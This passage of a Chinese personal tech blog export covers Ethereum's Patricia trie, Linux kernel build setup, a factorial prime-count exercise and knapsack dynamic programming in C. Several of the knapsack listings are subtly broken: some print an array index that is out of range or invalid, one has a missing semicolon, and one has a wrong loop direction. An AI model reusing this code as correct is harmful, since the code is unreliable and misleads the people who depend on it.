<h2 id="Trie"><a href="#Trie" class="headerlink" title="Trie"></a>Trie</h2><p>​    简单来说，<code>Trie</code>就是一个组织动态集合和关联数组的结构，由键值对组成，下面就是一个常见的Trie</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220325094252815.png" alt="image-20220325094252815"></p>
<h2 id="Dataset"><a href="#Dataset" class="headerlink" title="Dataset"></a>Dataset</h2><p>​    为了下文更容易叙述，这里我们采用一个统一的数据集样本</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">do</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">dog</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">dax</span>: <span class="number">2</span>,</span><br><span class="line">  <span class="attr">dogu</span>: <span class="number">3</span>,</span><br><span class="line">  <span class="attr">dodo</span>: <span class="number">4</span>,</span><br><span class="line">  <span class="attr">house</span>: <span class="number">5</span>,</span><br><span class="line">  <span class="attr">houses</span>: <span class="number">6</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    一般来说，键总是字符串，值的类型不确定</p>
<h2 id="Radix-trie"><a href="#Radix-trie" class="headerlink" title="Radix trie"></a>Radix trie</h2><p>​    <code>Radix trie</code>主要是用来优化查找的一种结构。其中在dataset中的键会作为<code>path</code>去到达相应的值，如下。</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220325094750289.png" alt="image-20220325094750289"></p>
<p>​    其中的每一条路径都是一个字符。查找的方法或许就类似于正常的二分查找的思路，比如如果我们想要查找dodo，那么整个的路径就和上面的红色路径类似，最终找到的值就是4。</p>
<p>​    然而，如果我们想要查找<code>houses</code>，就会发现我们需要走过非常多的null结点，毫无疑问这是非常影响查找效率的一件事情。事实上，我们是很容易想出一种优化方案的，也就是每个<code>path</code>不再是字符，而是字符串，或许可以理解成这些<code>keys</code>之间的最长相同前缀字符串？优化后的大概长这样。</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220325095835516.png" alt="image-20220325095835516"></p>
<p>​    这个时候，如果再想要查找<code>houses</code>，只需要两步就可以了。</p>
<h2 id="Merkle-trie"><a href="#Merkle-trie" class="headerlink" title="Merkle trie"></a>Merkle trie</h2><p>​    <code>Merkle trie</code>主要是用来验证数据的。还记得这个<code>Merkle</code>在哪见过吗？就是在区块链中每个区块都有一个<code>Merkle Hash</code>值，用来保证数据不可修改。因此，在<code>Merkle trie</code>中的数据就是用来创建一个哈希值来帮助验证数据，下面我们来看一个例子。</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220325100519558.png" alt="image-20220325100519558"></p>
<p>​    所有的数据都被存到叶子节点中，父结点的值就是两个孩子结点取哈希之后的值。如果试图去改变某个数据的值，从这个叶子节点网上的所有父结点都要重新计算，比如我们想要把叶子结点4改成44，那么相应的就会变成下面这样</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220325100820915.png" alt="image-20220325100820915"></p>
<p>​    因此，可以非常轻松的通过比较根节点的值来判断数据是否遭到篡改。</p>
<p>​    另外，这个树好像在之前也见到过？就是在廖雪峰的区块链教程里，不过之前没有提到过这个术语。</p>
<h1 id="Patricia-trie"><a href="#Patricia-trie" class="headerlink" title="Patricia trie"></a>Patricia trie</h1><p>​    根据前文，<code>Patricia trie</code>是<code>Radix trie</code>和<code>Merkle trie</code>的混合产物。下面会从一个不是很高效的<code>Patricia trie</code>引入，然后逐步优化到真正的使用的这个东西。</p>
<h2 id="Dataset-1"><a href="#Dataset-1" class="headerlink" title="Dataset"></a>Dataset</h2><p>​    还是先介绍一下使用的数据</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&#x27;cab8&#x27;</span>: <span class="string">&#x27;dog&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;cabe&#x27;</span>: <span class="string">&#x27;cat&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;39&#x27;</span>: <span class="string">&#x27;chicken&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;395&#x27;</span>: <span class="string">&#x27;duck&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;56f0&#x27;</span>: <span class="string">&#x27;horse&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h2><p>​    首先，在以太坊中，<code>node</code>就是一个键值对，其中键是结点的hash值，值是一个有17个元素的数组，前16个元素都是十六进制数，最后一个元素是这个结点存储的数据。前16个元素是作为一个索引存在的。</p>
<p>​    下图就是一个<code>node</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220325102308380.png" alt="image-20220325102308380"></p>
<h2 id="一个一般的Patricia-trie"><a href="#一个一般的Patricia-trie" class="headerlink" title="一个一般的Patricia trie"></a>一个一般的Patricia trie</h2><p>​    我们首先创建一个可以展示我们的数据集的一个trie，如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220325102547778.png" alt="image-20220325102547778"></p>
<p>​    这整个的建立过程大概就类似于哈希表？在查找数据的过程中，主要依靠两种查找方式，一个是按照数据库查询（this is database lookup，简写成tdl），另一个是按照trie查询（this is trie lookup，简写成ttl）。个人感觉前者就是依靠索引值去找到对应的键，后者是提供了一个查找的顺序。下面我们给一个例子。</p>
<p>​    比如我们要查找路径<code>395</code>对应的值，那么有如下几步：</p>
<ol>
<li>先把<code>395</code>分成3，9，5</li>
<li>从<code>rootHash</code>开始找到根节点</li>
<li>第一部分是<code>3</code>，根据索引就是<code>hashA</code></li>
<li>第二部分是<code>9</code>，然后根据前面找到<code>hashA</code>，发现对应的是<code>hashC</code></li>
<li>接下来按照上面的步骤找到<code>hashD</code></li>
<li>这个时候路径已经没了，所以就是这里对应的数据就是我们最终找到的数据。</li>
</ol>
<p>​     从上面的过程我们可以看出来，现在这个一般的<code>Patricia trie</code>已经同时具备了<code>Radix trie</code>和<code>Merkle trie</code>的特点。</p>
<p>​    然而，这里面有很多结点都没有数据，所以我们可以去进行一些优化。</p>
<h2 id="改进后的Patricia-trie"><a href="#改进后的Patricia-trie" class="headerlink" title="改进后的Patricia trie"></a>改进后的Patricia trie</h2><p>​    现在其实大的问题就是在查找的时候会跳过非常多的空结点，比如如果想要查找<code>56f0</code>，中间就需要跳过非常多的空结点。</p>
<p>​    就目前来看，我们需要解决两个问题：</p>
<ol>
<li>只有一条路径指向了最终的结果，比如<code>56f0</code></li>
<li>在路径的中间没有一些分叉，比如在查找<code>cabe</code>和<code>cabe</code>的时候。</li>
</ol>
<p>​    为了解决第一个问题，官方引入了<code>leaf</code>结点这个概念，为了解决第二个问题，官方引入了<code>extension</code>结点。这两种节点的是有两个元素的数组，第一个元素叫做<code>partialPath</code>，用来减少空结点。而第二个元素，如果当前节点是<code>leaf</code>的话，就是相应的数据，而如果当前节点是<code>extension</code>结点的话，就是对应的<code>merkleHash</code></p>
<p>​    下面先来看一下叶子节点可以做到的优化。</p>
<p>​    在加入叶子节点之后，整个trie变成了下面的形式。</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220325115444316.png" alt="image-20220325115444316">    在上面的那个trie中，我们把<code>hashE</code>变成了叶子结点，那么如果再想找<code>56f0</code>就会变成两步：</p>
<ol>
<li>通过索引<code>5</code>找到<code>hashE</code></li>
<li>首先现在不确定找到的<code>hashE</code>是哪种结点，我们就需要做相关的比较，将路径剩余的部分和这个结点的<code>partialPath</code>部分作比较，发现是相同的，就说明这是个叶子节点，只需要返回最后的数据部分即可。</li>
</ol>
<p>​    下面我们再加入<code>extension</code>结点</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220325120450301.png" alt="image-20220325120450301"></p>
<p>​    然后我们考虑查找一下<code>cab8</code></p>
<ol>
<li>首先先根据<code>c</code>找到<code>hashB</code></li>
<li>然后比较<code>partialPath</code>部分和要查找的路径的剩余部分，发现这应该是一个内部节点，接下来我们把<code>partialPath</code>路径从要查找的路径中移除，也就是说现在只需要查找一个<code>8</code>，然后<code>hashB</code>的第二个元素指向<code>hashJ</code></li>
<li>在<code>hashJ</code>里找8对应的，就是<code>hashK</code>，发现它的<code>partialPath</code>是空的，就返回对应的数据就行</li>
</ol>
<p>​    当然最后其实可以给出一个最好的版本</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220325121210490.png" alt="image-20220325121210490"></p>
<h2 id="完全的Patrica-trie"><a href="#完全的Patrica-trie" class="headerlink" title="完全的Patrica trie"></a>完全的Patrica trie</h2><p>​    现在来看一下完整版本，不过需要先介绍几条规则</p>
<ol>
<li>每个<code>partialPath</code>都应该是HP编码</li>
<li>结点中的每个元素都应该是RLP编码</li>
<li>结点的值在存储之前也应该进行RLP编码</li>
</ol>
<p>​    也就是说，现在的完成版本trie应该长下面这样</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220325121546563.png" alt="image-20220325121546563"></p>
<h2 id="用处"><a href="#用处" class="headerlink" title="用处"></a>用处</h2><p>​    在以太坊中，<code>Patricia trie</code>主要有如下四个trie：</p>
<ol>
<li>stateRoot</li>
<li>storageRoot</li>
<li>transactionRoot</li>
<li>receiptRoot</li>
</ol>
<p>​    其中134都是存到区块头里的</p>
]]></content>
      <categories>
        <category>分布式系统</category>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>分布式系统</tag>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>内核开发前置工作</title>
    <url>/2021/10/20/%E5%86%85%E6%A0%B8%E5%BC%80%E5%8F%91%E5%89%8D%E7%BD%AE%E5%B7%A5%E4%BD%9C/</url>
    <content><![CDATA[<h1>获取内核</h1>
<h2 id="内核源码"><a class="header-anchor" href="#内核源码">¶</a>内核源码</h2>
<p>​	这里主要有两种方式，一种是在官网<a href="http://www.kernel.org">http://www.kernel.org</a>获取当前版本的源码，可以是完整的压缩格式，也可以是增量补丁，另一种是使用Git，这里建议使用Git</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone git://git.kernel.org/pub/scm/linux/kernel/git/stable/linux-stable.git</span><br></pre></td></tr></table></figure>
<p>​	以上可以得到当前的稳定版代码</p>
<h2 id="编译内核"><a class="header-anchor" href="#编译内核">¶</a>编译内核</h2>
<p>​	在编译内核之前，需要对内核进行配置，自己需要什么功能，就勾选配置项加进去什么功能，进行配置主要有如下几种方法：</p>
<ol>
<li>
<p><strong>make config</strong>，用来逐一遍历所有的配置项，让用户来一一选择，但问题是太花费时间了。</p>
</li>
<li>
<p><strong>make menuconfig</strong>，图形界面工具，但是需要预先下载ncurse库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install ncurses-dev</span><br></pre></td></tr></table></figure>
<p>当然如果这样的话也有可能报如下错误：</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326170815014.png" alt="image-20220326170815014"></p>
<p>只需要安装词法解析器flex和语法解析器bison即可</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install flex</span><br><span class="line">sudo apt install bison</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong>make gconfig</strong>，基于gtk+的图形工具，没有使用过</p>
</li>
<li>
<p><strong>make defconfig</strong>，基于默认配置来创建一个配置</p>
</li>
</ol>
<p>​    在配置好内核之后，直接用<strong>make</strong>编译即可，当然编译中也会因为一些库没有安装而报错，这个时候根据提示安装需要的库即可</p>
<p>​	另外可以通过<strong>make &gt; /dev/null</strong>，来重定向无用的输出信息，可以通过<strong>make -jn</strong>来衍生多个编译作业来并行运行，进而加快编译过程，其中的<strong>n</strong>指的是衍生出的作业数，一般每个处理器上衍生出一个或两个作业即可，<s>也是怪我没有趁早看到这一点，现在已经编译好久了</s>，另外也可以使用<strong>distcc</strong>或者<strong>ccache</strong>来动态改善内核编译时间，distcc是一个分布式编译环境，可以参考<a href="https://blog.csdn.net/weiwangchao_/article/details/12275923">distcc</a>进行配置使用，ccache是以空间换时间的工具，可以参考<a href="https://blog.csdn.net/qq_34787560/article/details/89467776">ccache</a>进行配置</p>
<h2 id="安装内核"><a class="header-anchor" href="#安装内核">¶</a>安装内核</h2>
<p>​	直接<strong>make modules_install</strong>即可，这个时候编译好的模块会被安装到\lib\modules下</p>
<h1>内核开发特点</h1>
<h2 id="无标准头文件"><a class="header-anchor" href="#无标准头文件">¶</a>无标准头文件</h2>
<p>​	如果要用C库的话，对内核而言，效率太低，所以这些用户空间能用的所有的标准库在内核开发中都用不了，但是常用的库函数在内核中都已经得到了实现，比如操纵字符串的函数组在<strong>lib/string.c</strong>文件中，包含<strong>lib/string.h</strong>头文件即可使用，不过让人奇怪的是它没有实现printf函数，但是它有<strong>printk</strong>函数，基本用法一样，但是在printk函数中可以指定标签来设置优先级。</p>
<h2 id="GNU-C"><a class="header-anchor" href="#GNU-C">¶</a>GNU C</h2>
<p>​	只能用C语言及其扩展来编写，主要有以下几个扩展</p>
<ol>
<li>内联函数</li>
<li>内联汇编，可以在C函数中嵌入汇编指令</li>
<li>分支声明，可以用**likey()<strong>和</strong>unlikely()**来对分支语句进行优化，前者用来标记通常为真的选择，而后这样用来标记通常为假的选择，这两个东西是内核封装起来的宏</li>
</ol>
<h2 id="其他"><a class="header-anchor" href="#其他">¶</a>其他</h2>
<ol>
<li>没有内存保护机制</li>
<li>不要轻易使用浮点数</li>
<li>内核栈容积较小，并且固定</li>
<li>同步和并发</li>
<li>尽量保证可移植性</li>
</ol>
]]></content>
      <categories>
        <category>Linux</category>
        <category>内核</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>内核</tag>
      </tags>
  </entry>
  <entry>
    <title>关于数论的一道小题目</title>
    <url>/2021/10/11/%E5%85%B3%E4%BA%8E%E6%95%B0%E8%AE%BA%E7%9A%84%E4%B8%80%E9%81%93%E5%B0%8F%E9%A2%98%E7%9B%AE/</url>
    <content><![CDATA[<p>​    昨天一个上海交大的大佬问了我一道算法题，大概的意思就是，给出一个整数$n$，一个素数$p$，求出$n!$中包含因子$p$的数量。这个题目乍一看很简单，只需要先用一个循环算出$n!$，再用一个循环算出答案即可。但是我们没想到的是，交大的题目竟然会给一群刚学C++没几天的新生卡时长，这样计算运算时间太长，所有测试集都过不了，<del>不亏是交大</del>，那接下来只能从数学的角度对题目进行化简了。</p>
<p>​    其实另外的思路也很简单，只需要统计$1$~$n$中所有数包含质因子$p$的数量即可，我们注意到其实$n/p$就是$1$到$n$中出现过的$p$的倍数个数，所以其实$p$本身是给最终的答案贡献了这么多个值，然后还有$p$的次方数，也会贡献一定的量，我们需要考虑一下这个量具体是多少。仔细一想好像是$k\times (int)(\frac {n}{p^k})$，然后累加起来，但是这样其实就重复了，因为$p$的前$k-1$次方已经被计算过一次了，所以每次其实只需要加上$\frac {n}{p^k}$即可，所以最终我们可以得到答案为$ans=\frac{n}{p}+\frac{n}{p^2}+…+\frac{n}{p^k}$，并且$\frac{n}{p^{k+1}}=0$，具体代码就不写了，太简单了。</p>
]]></content>
      <categories>
        <category>算法</category>
        <category>数论</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>数论</tag>
      </tags>
  </entry>
  <entry>
    <title>动态规划之背包</title>
    <url>/2021/09/19/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E4%B9%8B%E8%83%8C%E5%8C%85/</url>
    <content><![CDATA[<h1 id="总述"><a href="#总述" class="headerlink" title="总述"></a>总述</h1><p>​    背包问题的最初版本就是01背包，接下来从01背包上衍生出了多种不同的背包问题，其问题大致的描述就是背包定容量，有很多物体，每一个物体都有给定的价值和体积，要求背包中装入的物品达到最大值</p>
<h1 id="01背包"><a href="#01背包" class="headerlink" title="01背包"></a>01背包</h1><h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>​    这种背包指的就是所有的物品只有一件，只能有选或不选两种状态，因此也称之为01背包</p>
<h2 id="转化"><a href="#转化" class="headerlink" title="转化"></a>转化</h2><p>​    我们考虑一下动态规划的思想，由于我们需要两个参数$i$，$j$来衡量状态，所以考虑二维数组$dp[i][j]$，其中$i$表示第$i$个物品，$j$表示剩余空间为$j$，那么通过分类，非常容易就能得到动态转移方程，即<img src="https://raw.githubusercontent.com/ysjyx7/images/master/img/20190312205757755.png" alt="img"></p>
<p><strong><em>图片摘自CSDN博客，侵删</em></strong></p>
<p>​    然后就只需要简单地给定一下边界条件，就可以完成求解</p>
<h2 id="例题（洛谷P1048）"><a href="#例题（洛谷P1048）" class="headerlink" title="例题（洛谷P1048）"></a>例题（洛谷P1048）</h2><p><img src="https://raw.githubusercontent.com/ysjyx7/images/master/img/image-20210919220425335.png" alt="image-20210919220425335"></p>
<h3 id="代码如下"><a href="#代码如下" class="headerlink" title="代码如下"></a>代码如下</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author: ysj </span></span><br><span class="line"><span class="comment"> * @Date: 2021-09-19 09:59:00 </span></span><br><span class="line"><span class="comment"> * @Last Modified by: ysj</span></span><br><span class="line"><span class="comment"> * @Last Modified time: 2021-09-19 11:33:23</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief  动态规划中的背包问题，这里属于一种简单地01背包</span></span><br><span class="line"><span class="comment"> * @note   其实这道题目就相当于是一个模板了</span></span><br><span class="line"><span class="comment"> * @retval </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> max(a,b) ((a)&gt;(b)?(a):(b))</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t, m;</span><br><span class="line">    <span class="keyword">int</span> time[<span class="number">101</span>], value[<span class="number">101</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;t, &amp;m);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;time[i], &amp;value[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> v[<span class="number">101</span>][<span class="number">1001</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= m;i++)</span><br><span class="line">        v[i][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= t;j++)</span><br><span class="line">        v[<span class="number">0</span>][j] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= t;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(j&lt;time[i])<span class="comment">//如果装不下</span></span><br><span class="line">            &#123;</span><br><span class="line">                v[i][j] = v[i - <span class="number">1</span>][j];<span class="comment">//那么就和之前那个相等</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                v[i][j] = max(v[i<span class="number">-1</span>][j],v[i<span class="number">-1</span>][j-time[i]]+value[i]);<span class="comment">//否则进行一次比较大小</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, v[m][t]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><p>​    注意到我们上面的那个状态转移方程其实在状态转移的时候仅仅使用了当前行和上一行的一些值，所以其实没必要使用一个二维数组来保存所有的状态，只需要每次更新上一次的状态即可，所以所需要的二维数组可以转化为一个一维数组</p>
<h3 id="代码如下-1"><a href="#代码如下-1" class="headerlink" title="代码如下"></a>代码如下</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author: ysj </span></span><br><span class="line"><span class="comment"> * @Date: 2021-09-19 09:59:00 </span></span><br><span class="line"><span class="comment"> * @Last Modified by: ysj</span></span><br><span class="line"><span class="comment"> * @Last Modified time: 2021-09-19 11:33:23</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief  动态规划中的背包问题，这里属于一种简单地01背包</span></span><br><span class="line"><span class="comment"> * @note   其实这道题目就相当于是一个模板了</span></span><br><span class="line"><span class="comment"> * @retval </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> max(a,b) ((a)&gt;(b)?(a):(b))</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t, m;</span><br><span class="line">    <span class="keyword">int</span> time[<span class="number">101</span>], value[<span class="number">101</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;t, &amp;m);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;time[i], &amp;value[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> v[<span class="number">2</span>][<span class="number">1001</span>];</span><br><span class="line">    v[<span class="number">0</span>][<span class="number">0</span>]=<span class="number">0</span>,v[<span class="number">1</span>][<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= t;j++)</span><br><span class="line">        &#123;<span class="comment">//其实就是通过取余来反复折腾</span></span><br><span class="line">            v[i%<span class="number">2</span>][j] = v[(i<span class="number">-1</span>)%<span class="number">2</span>][j];<span class="comment">//不管怎样都要进行赋值</span></span><br><span class="line">                   <span class="keyword">if</span>(j-time[i]&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">                       v[i%<span class="number">2</span>][j]=max(v[(i<span class="number">-1</span>)%<span class="number">2</span>][j],v[(i<span class="number">-1</span>)%<span class="number">2</span>][j-time[i]]+value[i]);</span><br><span class="line">                   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                       v[i%<span class="number">2</span>][j]=v[(i<span class="number">-1</span>)%<span class="number">2</span>][j];</span><br><span class="line">                   &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, v[m][t]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="再度优化"><a href="#再度优化" class="headerlink" title="再度优化"></a>再度优化</h2><h3 id="代码如下-2"><a href="#代码如下-2" class="headerlink" title="代码如下"></a>代码如下</h3><p>​    其实再仔细想一想，每一个过程，它所需要的其实就是它左边的数值和它上面的数值因此其实也不用两个数组来对它进行优化，这里可以利用滚动数组的思想</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author: ysj </span></span><br><span class="line"><span class="comment"> * @Date: 2021-09-19 09:59:00 </span></span><br><span class="line"><span class="comment"> * @Last Modified by: ysj</span></span><br><span class="line"><span class="comment"> * @Last Modified time: 2021-09-19 11:33:23</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief  动态规划中的背包问题，这里属于一种简单地01背包</span></span><br><span class="line"><span class="comment"> * @note   其实这道题目就相当于是一个模板了</span></span><br><span class="line"><span class="comment"> * @retval </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> max(a,b) ((a)&gt;(b)?(a):(b))</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t, m;</span><br><span class="line">    <span class="keyword">int</span> time[<span class="number">101</span>], value[<span class="number">101</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;t, &amp;m);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;time[i], &amp;value[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> v[<span class="number">1001</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= t;j++)</span><br><span class="line">        v[j] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = t; j &gt;= time[i];j--)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(j&gt;=time[i])</span><br><span class="line">                v[j]=max(v[j],v[j-time[i]]+value[i])<span class="comment">//这里左边的v[j]表示正在修改的当前行，而右边的表示上一行</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, v[m][t]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    对于这里二重循环需要倒着来的原因，如果像之前一样正着来，由于01背包本身问题的定义，会出现矛盾，这里选用了在网上看到的一种图解，感觉讲述的还是非常清晰的</p>
<p><img src="https://raw.githubusercontent.com/ysjyx7/images/master/img/image-20210919222540905.png" alt="image-20210919222540905"></p>
<p><strong><em>侵删</em></strong></p>
<h1 id="完全背包"><a href="#完全背包" class="headerlink" title="完全背包"></a>完全背包</h1><h2 id="简述-1"><a href="#简述-1" class="headerlink" title="简述"></a>简述</h2><p>​    完全背包就是在01背包的基础上做了改变，也就是说每个物品数量都变成了无限个</p>
<h2 id="转化-1"><a href="#转化-1" class="headerlink" title="转化"></a>转化</h2><p>​    其实这里和01背包问题本质是差不多的，一个朴素的想法其实就是在二重循环中再加入一重循环，该循环用来判断各个物品所能够选择的次数</p>
<h2 id="例题（洛谷P1616）"><a href="#例题（洛谷P1616）" class="headerlink" title="例题（洛谷P1616）"></a>例题（洛谷P1616）</h2><p><img src="https://raw.githubusercontent.com/ysjyx7/images/master/img/image-20210920093809682.png" alt></p>
<h3 id="代码如下-3"><a href="#代码如下-3" class="headerlink" title="代码如下"></a>代码如下</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author: ysj </span></span><br><span class="line"><span class="comment"> * @Date: 2021-09-19 10:30:27 </span></span><br><span class="line"><span class="comment"> * @Last Modified by: ysj</span></span><br><span class="line"><span class="comment"> * @Last Modified time: 2021-09-19 10:58:47</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> max(a,b) ((a)&gt;(b)?(a):(b))</span></span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> ans[<span class="number">10000001</span>];</span><br><span class="line"><span class="keyword">int</span> time[<span class="number">10001</span>], value[<span class="number">10001</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t, m;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;t, &amp;m);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m;i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;time[i], &amp;value[i]);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m;i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = t; j &gt;= time[i];j++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k*time[i]&lt;=j;k++)</span><br><span class="line">                ans[j] = max(ans[j], ans[j - k*time[i]] + k*value[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span 